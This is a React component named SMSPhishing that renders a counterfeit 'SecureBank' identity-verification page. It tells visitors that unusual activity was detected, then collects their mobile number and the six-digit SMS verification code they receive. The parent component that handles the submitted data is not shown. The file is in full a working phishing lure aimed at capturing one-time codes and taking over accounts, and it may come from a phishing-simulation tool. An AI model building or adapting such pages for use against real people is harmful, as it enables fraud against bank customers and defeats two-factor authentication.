'use client';

import { useState } from 'react';

export default function SMSPhishing({ formData, handleChange, handleSubmit, loading }) {
  const [step, setStep] = useState(1);

  const handleNextStep = (e) => {
    e.preventDefault();
    if (step === 1 && formData.phone) {
      setStep(2);
    } else if (step === 2) {
      handleSubmit(e);
    }
  };

  return (
    <div className="flex min-h-screen items-center justify-center bg-gray-100 px-4 font-sans">
      <div className="w-full max-w-md overflow-hidden rounded-xl bg-white shadow-2xl">
        {/* Header with "Bank" styling */}
        <div className="bg-[#004b87] px-8 py-6 text-white">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <svg className="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
              </svg>
              <span className="text-xl font-bold tracking-wide">SecureBank</span>
            </div>
            <div className="text-xs opacity-80">
              <p>Secure Connection</p>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="p-8">
          <div className="mb-8 text-center">
            <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-blue-50">
              <svg className="h-8 w-8 text-[#004b87]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
            </div>
            <h2 className="text-2xl font-bold text-gray-900">Identity Verification</h2>
            <p className="mt-2 text-sm text-gray-600">
              We detected unusual activity. Please verify your mobile number to secure your account.
            </p>
          </div>

          <form onSubmit={handleNextStep} className="space-y-6">
            {step === 1 && (
              <div className="space-y-4">
                <div>
                  <label htmlFor="phone" className="block text-sm font-medium text-gray-700">
                    Mobile Number
                  </label>
                  <div className="relative mt-1 rounded-md shadow-sm">
                    <div className="pointer-events-none absolute inset-y-0 left-0 flex items-center pl-3">
                      <span className="text-gray-500 sm:text-sm">📱</span>
                    </div>
                    <input
                      type="tel"
                      name="phone"
                      id="phone"
                      required
                      className="block w-full rounded-md border border-gray-300 pl-10 py-3 focus:border-[#004b87] focus:ring-[#004b87] sm:text-sm text-gray-900"
                      placeholder="(555) 000-0000"
                      value={formData.phone || ''}
                      onChange={handleChange}
                    />
                  </div>
                </div>
                <button
                  type="submit"
                  className="flex w-full justify-center rounded-md border border-transparent bg-[#004b87] py-3 px-4 text-sm font-medium text-white shadow-sm hover:bg-[#003865] focus:outline-none focus:ring-2 focus:ring-[#004b87] focus:ring-offset-2 transition-colors"
                >
                  Send Verification Code
                </button>
              </div>
            )}

            {step === 2 && (
              <div className="space-y-4">
                <div className="rounded-md bg-blue-50 p-4">
                  <div className="flex">
                    <div className="flex-shrink-0">
                      <svg className="h-5 w-5 text-blue-400" viewBox="0 0 20 20" fill="currentColor">
                        <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
                      </svg>
                    </div>
                    <div className="ml-3 flex-1 md:flex md:justify-between">
                      <p className="text-sm text-blue-700">
                        A verification code has been sent to <span className="font-semibold">{formData.phone}</span>
                      </p>
                    </div>
                  </div>
                </div>

                <div>
                  <label htmlFor="code" className="block text-sm font-medium text-gray-700">
                    Verification Code
                  </label>
                  <div className="mt-1">
                    <input
                      type="text"
                      name="code"
                      id="code"
                      required
                      maxLength={6}
                      className="block w-full rounded-md border border-gray-300 py-3 text-center text-2xl tracking-[0.5em] font-mono text-gray-900 focus:border-[#004b87] focus:ring-[#004b87]"
                      placeholder="000000"
                      value={formData.code || ''}
                      onChange={handleChange}
                    />
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={loading}
                  className="flex w-full justify-center rounded-md border border-transparent bg-[#004b87] py-3 px-4 text-sm font-medium text-white shadow-sm hover:bg-[#003865] focus:outline-none focus:ring-2 focus:ring-[#004b87] focus:ring-offset-2 disabled:opacity-70 transition-colors"
                >
                  {loading ? 'Verifying...' : 'Verify Identity'}
                </button>

                <button
                  type="button"
                  onClick={() => setStep(1)}
                  className="w-full text-center text-sm text-gray-500 hover:text-gray-700"
                >
                  Change phone number
                </button>
              </div>
            )}
          </form>
        </div>

        {/* Footer */}
        <div className="bg-gray-50 px-8 py-4 border-t border-gray-200">
          <div className="flex justify-center space-x-6 text-xs text-gray-500">
            <a href="#" className="hover:text-gray-700">Privacy Policy</a>
            <a href="#" className="hover:text-gray-700">Terms of Service</a>
            <a href="#" className="hover:text-gray-700">Security Center</a>
          </div>
          <p className="mt-2 text-center text-xs text-gray-400">
            &copy; 2024 SecureBank Corporation. All rights reserved.
          </p>
        </div>
      </div>
    </div>
  );
}
